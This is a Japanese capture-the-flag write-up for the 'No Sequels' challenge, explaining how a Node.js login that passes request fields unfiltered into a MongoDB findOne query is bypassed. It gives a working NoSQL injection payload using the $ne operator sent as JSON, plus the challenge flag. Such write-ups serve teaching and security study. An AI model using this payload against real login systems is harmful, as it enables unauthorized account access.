# No Sequels

# 手順
ソースを読むと`db.collection.findOne()`から[MongoDB]が使われてると思われる。よって[NoSQL Injection]を用いる。  
ユーザー入力が絡む箇所は  
```javascript
var user = req.body.username;
var pass = req.body.password;
```
であり、これが使われている場所を見ると
```javascript
var query = {
        username: user,
        password: pass
}

db.collection('users').findOne(query, function (err, user) {
    // ...
}
```

となっている。  
以下では
```javascript
var query = {
	username: req.body.username, // リクエストのusernameパラメータ
	password: req.body.password  // リクエストのpasswordパラメータ
}
```

として考える。
findやfindOne関数は受け取ったクエリに対する検索を行う。そしてこのクエリは単に値に文字列が来た場合はキーがそれに一致するものを探すがJSONを指定することで複雑な条件句で検索することができる。  
MongoDBの検索演算子には例えば$ne(指定した値でない)や$in(指定した配列に含まれている)といったものがある。クエリの値に`{operator: operand}`といったJSONを指定することでこの演算子で一致した結果を返すことができる。  
したがって

```javascript
var query = {
	username: {"$ne": "unexist"},
	password: {"$ne": "unexist"}
}
```
とすればusernameがunexistでなくpasswordがunexistでないものを検索することになる。  
このようにJSONを注入するためにはリクエストのヘッダに`content-Type:application/json`をセットし(デフォルトは`application/x-www-form-urlencode`)、下記ペイロードをリクエストボディに設定して送信すれば良い。

## Payload
リクエストボディに以下のJSONを記述して送り込む
```javascript
{
	"username": {"$ne": "unexist"},
	"password": {"$ne": "unexist"}
}
```
但し、unexistの部分はDB上に存在しない文字であればなんでも良い

## Flag
actf{no_sql_doesn't_mean_no_vuln}
